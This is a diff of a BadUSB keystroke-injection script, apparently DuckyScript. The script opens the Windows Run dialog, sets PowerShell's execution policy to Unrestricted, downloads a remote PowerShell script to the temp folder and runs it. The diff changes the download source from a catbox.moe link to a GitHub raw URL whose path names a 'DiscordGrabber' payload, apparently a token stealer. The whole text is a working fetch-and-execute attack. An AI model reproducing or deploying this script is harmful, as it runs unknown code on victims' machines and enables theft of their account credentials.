@@ -4,7 +4,7 @@ REM Change URL by yours
 DELAY 1000
 GUI r
 DELAY 500
-STRING powershell Set-ExecutionPolicy -Scope "CurrentUser" -ExecutionPolicy "Unrestricted"; powershell -c Start-BitsTransfer -Source https://files.catbox.moe/pzt5mz -Destination $env:temp\p.ps1; powershell $env:temp\p.ps1;
+STRING powershell Set-ExecutionPolicy -Scope "CurrentUser" -ExecutionPolicy "Unrestricted"; powershell -c Start-BitsTransfer -Source https://raw.githubusercontent.com/Gvte-Kali/BadStuffHosting/main/DiscordGrabber/Test/payload.ps1 -Destination $env:temp\p.ps1; powershell $env:temp\p.ps1;
 DELAY 500
 ENTER
 DELAY 250
